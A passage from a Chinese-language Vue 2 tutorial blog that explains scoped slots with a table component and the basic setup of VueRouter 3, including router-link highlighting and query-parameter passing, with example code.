title="插槽分类"></a>插槽分类</h2><ul><li><p>默认插槽</p></li><li><p>具名插槽</p><p>插槽只有两种，作用域插槽不属于插槽的一种分类</p></li></ul><h2 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h2><p>定义slot 插槽的同时, 是可以<strong>传值</strong>的。给 <strong>插槽</strong> 上可以 <strong>绑定数据</strong>，将来 <strong>使用组件时可以用</strong></p><h2 id="场景-2"><a href="#场景-2" class="headerlink" title="场景"></a>场景</h2><p>封装表格组件</p><p><img src="/2023/12/28/Vue/1682414342139.png" alt="68241434213"></p><h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><ol><li><p>给 slot 标签, 以 添加属性的方式传值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;slot :id=&quot;item.id&quot; msg=&quot;测试文本&quot;&gt;&lt;/slot&gt;</span><br></pre></td></tr></table></figure></li><li><p>所有添加的属性, 都会被收集到一个对象中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; id: 3, msg: &#x27;测试文本&#x27; &#125;</span><br></pre></td></tr></table></figure></li><li><p>在template中, 通过  <code> #插槽名= &quot;obj&quot;</code> 接收，默认插槽名为 default</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;MyTable :list=&quot;list&quot;&gt;</span><br><span class="line">  &lt;template #default=&quot;obj&quot;&gt;</span><br><span class="line">    &lt;button @click=&quot;del(obj.id)&quot;&gt;删除&lt;/button&gt;</span><br><span class="line">  &lt;/template&gt;</span><br><span class="line">&lt;/MyTable&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="代码示例-6"><a href="#代码示例-6" class="headerlink" title="代码示例"></a>代码示例</h2><p>MyTable.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;table class=&quot;my-table&quot;&gt;</span><br><span class="line">    &lt;thead&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;序号&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;年纪&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;操作&lt;/th&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">    &lt;/thead&gt;</span><br><span class="line">    &lt;tbody&gt;</span><br><span class="line">      &lt;tr v-for=&quot;(item, index) in data&quot; :key=&quot;item.id&quot;&gt;</span><br><span class="line">        &lt;td&gt;&#123;&#123; index + 1 &#125;&#125;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&#123;&#123; item.name &#125;&#125;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&#123;&#123; item.age &#125;&#125;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;</span><br><span class="line">          &lt;!-- 1. 给slot标签，添加属性的方式传值 --&gt;</span><br><span class="line">          &lt;slot :row=&quot;item&quot; msg=&quot;测试文本&quot;&gt;&lt;/slot&gt;</span><br><span class="line"></span><br><span class="line">          &lt;!-- 2. 将所有的属性，添加到一个对象中 --&gt;</span><br><span class="line">          &lt;!-- </span><br><span class="line">             &#123;</span><br><span class="line">               row: &#123; id: 2, name: &#x27;孙大明&#x27;, age: 19 &#125;,</span><br><span class="line">               msg: &#x27;测试文本&#x27;</span><br><span class="line">             &#125;</span><br><span class="line">           --&gt;</span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">    &lt;/tbody&gt;</span><br><span class="line">  &lt;/table&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  props: &#123;</span><br><span class="line">    data: Array</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>App.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;MyTable :data=&quot;list&quot;&gt;</span><br><span class="line">      &lt;!-- 3. 通过template #插槽名=&quot;变量名&quot; 接收 --&gt;</span><br><span class="line">      &lt;template #default=&quot;obj&quot;&gt;</span><br><span class="line">        &lt;button @click=&quot;del(obj.row.id)&quot;&gt;</span><br><span class="line">          删除</span><br><span class="line">        &lt;/button&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">    &lt;/MyTable&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;MyTable :data=&quot;list2&quot;&gt;</span><br><span class="line">      &lt;template #default=&quot;&#123; row &#125;&quot;&gt;</span><br><span class="line">        &lt;button @click=&quot;show(row)&quot;&gt;查看&lt;/button&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">    &lt;/MyTable&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import MyTable from &#x27;./components/MyTable.vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      list: [</span><br><span class="line">        &#123; id: 1, name: &#x27;张小花&#x27;, age: 18 &#125;,</span><br><span class="line">        &#123; id: 2, name: &#x27;孙大明&#x27;, age: 19 &#125;,</span><br><span class="line">        &#123; id: 3, name: &#x27;刘德忠&#x27;, age: 17 &#125;,</span><br><span class="line">      ],</span><br><span class="line">      list2: [</span><br><span class="line">        &#123; id: 1, name: &#x27;赵小云&#x27;, age: 18 &#125;,</span><br><span class="line">        &#123; id: 2, name: &#x27;刘蓓蓓&#x27;, age: 19 &#125;,</span><br><span class="line">        &#123; id: 3, name: &#x27;姜肖泰&#x27;, age: 17 &#125;,</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    del (id) &#123;</span><br><span class="line">      this.list = this.list.filter(item =&gt; item.id !== id)</span><br><span class="line">    &#125;,</span><br><span class="line">    show (row) &#123;</span><br><span class="line">      // console.log(row);</span><br><span class="line">      alert(`姓名：$&#123;row.name&#125;; 年纪：$&#123;row.age&#125;`)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    MyTable</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="路由的基本使用"><a href="#路由的基本使用" class="headerlink" title="路由的基本使用"></a>路由的基本使用</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>认识插件 VueRouter，掌握 VueRouter 的基本使用步骤</p><h2 id="作用-4"><a href="#作用-4" class="headerlink" title="作用"></a>作用</h2><p><strong>修改</strong>地址栏路径时，<strong>切换显示</strong>匹配的<strong>组件</strong></p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>Vue 官方的一个路由插件，是一个第三方包</p><h2 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h2><p><a href="https://v3.router.vuejs.org/zh/">https://v3.router.vuejs.org/zh/</a></p><h2 id="VueRouter的使用（5-2）"><a href="#VueRouter的使用（5-2）" class="headerlink" title="VueRouter的使用（5+2）"></a>VueRouter的使用（5+2）</h2><p>固定5个固定的步骤（不用死背，熟能生巧）</p><ol><li><p>下载 VueRouter 模块到当前工程，版本3.6.5</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yarn add vue-router@3.6.5</span><br><span class="line">npm install vue-router@3.6.5</span><br></pre></td></tr></table></figure></li><li><p>main.js中引入VueRouter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import VueRouter from &#x27;vue-router&#x27;</span><br></pre></td></tr></table></figure></li><li><p>安装注册</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.use(VueRouter)</span><br></pre></td></tr></table></figure></li><li><p>创建路由对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const router = new VueRouter()</span><br></pre></td></tr></table></figure></li><li><p>注入，将路由对象注入到new Vue实例中，建立关联</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">new Vue(&#123;</span><br><span class="line">  render: h =&gt; h(App),</span><br><span class="line">  router:router</span><br><span class="line">&#125;).$mount(&#x27;#app&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>当我们配置完以上5步之后 就可以看到浏览器地址栏中的路由 变成了 &#x2F;#&#x2F;的形式。表示项目的路由已经被Vue-Router管理了</p><p><img src="/2023/12/28/Vue/1682479207453.png" alt="68247920745"></p><h2 id="代码示例-7"><a href="#代码示例-7" class="headerlink" title="代码示例"></a>代码示例</h2><p>main.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 路由的使用步骤 5 + 2</span><br><span class="line">// 5个基础步骤</span><br><span class="line">// 1. 下载 v3.6.5</span><br><span class="line">// yarn add vue-router@3.6.5</span><br><span class="line">// 2. 引入</span><br><span class="line">// 3. 安装注册 Vue.use(Vue插件)</span><br><span class="line">// 4. 创建路由对象</span><br><span class="line">// 5. 注入到new Vue中，建立关联</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import VueRouter from &#x27;vue-router&#x27;</span><br><span class="line">Vue.use(VueRouter) // VueRouter插件初始化</span><br><span class="line"></span><br><span class="line">const router = new VueRouter()</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">  render: h =&gt; h(App),</span><br><span class="line">  router</span><br><span class="line">&#125;).$mount(&#x27;#app&#x27;)</span><br></pre></td></tr></table></figure><h2 id="两个核心步骤"><a href="#两个核心步骤" class="headerlink" title="两个核心步骤"></a>两个核心步骤</h2><ol><li><p>创建需要的组件 (views目录)，配置路由规则</p><p><img src="/2023/12/28/Vue/1682479639666.png" alt="68247963966"></p></li><li><p>配置导航，配置路由出口(路径匹配的组件显示的位置)</p><p>App.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;footer_wrap&quot;&gt;</span><br><span class="line">  &lt;a href=&quot;#/find&quot;&gt;发现音乐&lt;/a&gt;</span><br><span class="line">  &lt;a href=&quot;#/my&quot;&gt;我的音乐&lt;/a&gt;</span><br><span class="line">  &lt;a href=&quot;#/friend&quot;&gt;朋友&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;top&quot;&gt;</span><br><span class="line">  &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ol><h3 id><a href="#" class="headerlink" title></a></h3><h1 id="组件的存放目录问题"><a href="#组件的存放目录问题" class="headerlink" title="组件的存放目录问题"></a>组件的存放目录问题</h1><p>注意： <strong>.vue文件</strong> 本质无区别</p><h2 id="组件分类"><a href="#组件分类" class="headerlink" title="组件分类"></a>组件分类</h2><p> .vue文件分为2类，都是 <strong>.vue文件（本质无区别）</strong></p><ul><li>页面组件 （配置路由规则时使用的组件）</li><li>复用组件（多个组件中都使用到的组件）</li></ul><p><img src="/2023/12/28/Vue/1682445397959.png" alt="68244539795"></p><h2 id="存放目录"><a href="#存放目录" class="headerlink" title="存放目录"></a>存放目录</h2><p>分类开来的目的就是为了 <strong>更易维护</strong></p><ol><li><p>src&#x2F;views文件夹</p><p>页面组件 - 页面展示 - 配合路由用</p></li><li><p>src&#x2F;components文件夹</p><p>复用组件 - 展示数据 - 常用于复用</p></li></ol><h1 id="路由的封装抽离"><a href="#路由的封装抽离" class="headerlink" title="路由的封装抽离"></a>路由的封装抽离</h1><p>问题：所有的路由配置都在main.js中合适吗？</p><p>目标：将路由模块抽离出来。  好处：<strong>拆分模块，利于维护</strong></p><p><img src="/2023/12/28/Vue/1682481410304.png" alt="68248141030"></p><p>路径简写：</p><p><strong>脚手架环境下</strong> @指代src目录，可以用于快速引入组件</p><h1 id="声明式导航-导航链接"><a href="#声明式导航-导航链接" class="headerlink" title="声明式导航-导航链接"></a>声明式导航-导航链接</h1><h2 id="需求-5"><a href="#需求-5" class="headerlink" title="需求"></a>需求</h2><p>实现导航高亮效果</p><p><img src="/2023/12/28/Vue/1682492044744.png" alt="68249204474"></p><p>如果使用a标签进行跳转的话，需要给当前跳转的导航加样式，同时要移除上一个a标签的样式，太麻烦！！！</p><h2 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h2><p>vue-router 提供了一个全局组件 router-link (取代 a 标签)</p><ul><li><strong>能跳转</strong>，配置 to 属性指定路径(<strong>必须</strong>) 。本质还是 a 标签 ，<strong>to 无需 #</strong></li><li><strong>能高亮</strong>，默认就会提供<strong>高亮类名</strong>，可以直接设置高亮样式</li></ul><p>语法： <router-link to="path的值">发现音乐</router-link></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;div class=&quot;footer_wrap&quot;&gt;</span><br><span class="line">    &lt;router-link to=&quot;/find&quot;&gt;发现音乐&lt;/router-link&gt;</span><br><span class="line">    &lt;router-link to=&quot;/my&quot;&gt;我的音乐&lt;/router-link&gt;</span><br><span class="line">    &lt;router-link to=&quot;/friend&quot;&gt;朋友&lt;/router-link&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div class=&quot;top&quot;&gt;</span><br><span class="line">    &lt;!-- 路由出口 → 匹配的组件所展示的位置 --&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="通过router-link自带的两个样式进行高亮"><a href="#通过router-link自带的两个样式进行高亮" class="headerlink" title="通过router-link自带的两个样式进行高亮"></a>通过router-link自带的两个样式进行高亮</h2><p>使用router-link跳转后，我们发现。当前点击的链接默认加了两个class的值 <code>router-link-exact-active</code>和<code>router-link-active</code></p><p>我们可以给任意一个class属性添加高亮样式即可实现功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;div class=&quot;footer_wrap&quot;&gt;</span><br><span class="line">      &lt;router-link to=&quot;/find&quot;&gt;发现音乐&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to=&quot;/my&quot;&gt;我的音乐&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to=&quot;/friend&quot;&gt;朋友&lt;/router-link&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;top&quot;&gt;</span><br><span class="line">      &lt;!-- 路由出口 → 匹配的组件所展示的位置 --&gt;</span><br><span class="line">      &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">...</span><br><span class="line">&lt;!-- 给选中的router绑定样式 --&gt;</span><br><span class="line">.footer_wrap a.router-link-active &#123;</span><br><span class="line">  background-color: purple;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h1 id="声明式导航-两个类名"><a href="#声明式导航-两个类名" class="headerlink" title="声明式导航-两个类名"></a>声明式导航-两个类名</h1><p>当我们使用<code>&lt;router-link&gt;&lt;/router-link&gt;</code>跳转时，自动给当前导航加了<strong>两个类名</strong></p><p><img src="/2023/12/28/Vue/1682493121052.png" alt="68249312105"></p><h2 id="router-link-active"><a href="#router-link-active" class="headerlink" title="router-link-active"></a>router-link-active</h2><p><strong>模糊匹配（用的多）</strong></p><p>to&#x3D;”&#x2F;my”  可以匹配 &#x2F;my    &#x2F;my&#x2F;a    &#x2F;my&#x2F;b    ….  </p><p>只要是以&#x2F;my开头的路径 都可以和 to&#x3D;”&#x2F;my”匹配到</p><h2 id="router-link-exact-active"><a href="#router-link-exact-active" class="headerlink" title="router-link-exact-active"></a>router-link-exact-active</h2><p><strong>精确匹配</strong></p><p>to&#x3D;”&#x2F;my” 仅可以匹配  &#x2F;my</p><h1 id="声明式导航-查询参数传参"><a href="#声明式导航-查询参数传参" class="headerlink" title="声明式导航-查询参数传参"></a>声明式导航-查询参数传参</h1><h2 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h2><p>在跳转路由时，进行传参</p><p><img src="/2023/12/28/Vue/1682494423923.png" alt="68249442392"></p><p>比如：现在我们在搜索页点击了热门搜索链接，跳转到详情页，<strong>需要把点击的内容带到详情页</strong>，改怎么办呢？</p><h2 id="跳转传参"><a href="#跳转传参" class="headerlink" title="跳转传参"></a>跳转传参</h2><p>我们可以通过两种方式，在跳转的时候把所需要的参数传到其他页面中</p><ul><li>查询参数传参</li><li>动态路由传参</li></ul><h2 id="查询参数传参"><a href="#查询参数传参" class="headerlink" title="查询参数传参"></a>查询参数传参</h2><ul><li><p>如何传参？</p><p><code>&lt;router-link to=&quot;/path?参数名=值&quot;&gt;&lt;/router-link&gt;</code></p></li><li><p>如何接受参数</p><p>固定用法：<code>$router.query.参数名</code></p></li></ul><h2 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h2><p>App.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;link&quot;&gt;</span><br><span class="line">      &lt;router-link to=&quot;/home&quot;&gt;首页&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to=&quot;/search&quot;&gt;搜索页&lt;/router-link&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>Home.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;home&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;logo-box&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;search-box&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;text&quot;&gt;</span><br><span class="line">      &lt;button&gt;搜索一下&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;hot-link&quot;&gt;</span><br><span class="line">      热门搜索：</span><br><span class="line">      &lt;router-link to=&quot;/search?key=黑马程序员&quot;&gt;黑马程序员&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to=&quot;/search?key=前端培训&quot;&gt;前端培训&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link to=&quot;/search?key=如何成为前端大牛&quot;&gt;如何成为前端大牛&lt;/router-link&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;FindMusic&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>Search.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;search&quot;&gt;</span><br><span class="line">    &lt;p&gt;搜索关键字: &#123;&#123; $route.query.key &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;搜索结果: &lt;/p&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &lt;li&gt;.............&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;.............&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;.............&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;.............&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;MyFriend&#x27;,</span><br><span class="line">  created () &#123;</span><br><span class="line">    // 在created中，获取路由参数</span><br><span class="line">      console.log(this.$route.query.key);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">.search &#123;</span><br><span class="line">  width: 400px;</span><br><span class="line">  height: 240px;</span><br><span class="line">  padding: 0 20px;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">  border: 2px solid #c4c7ce;</span><br><span class="line">  border-radius: 5px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>router&#x2F;index.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&#x27;@/views/Home&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Search</span> <span class="keyword">from</span> <span class="string">&#x27;@/views/Search&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>) <span class="comment">// VueRouter插件初始化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建了一个路由对象</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/home&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Home</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/search&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Search</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><p>main.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 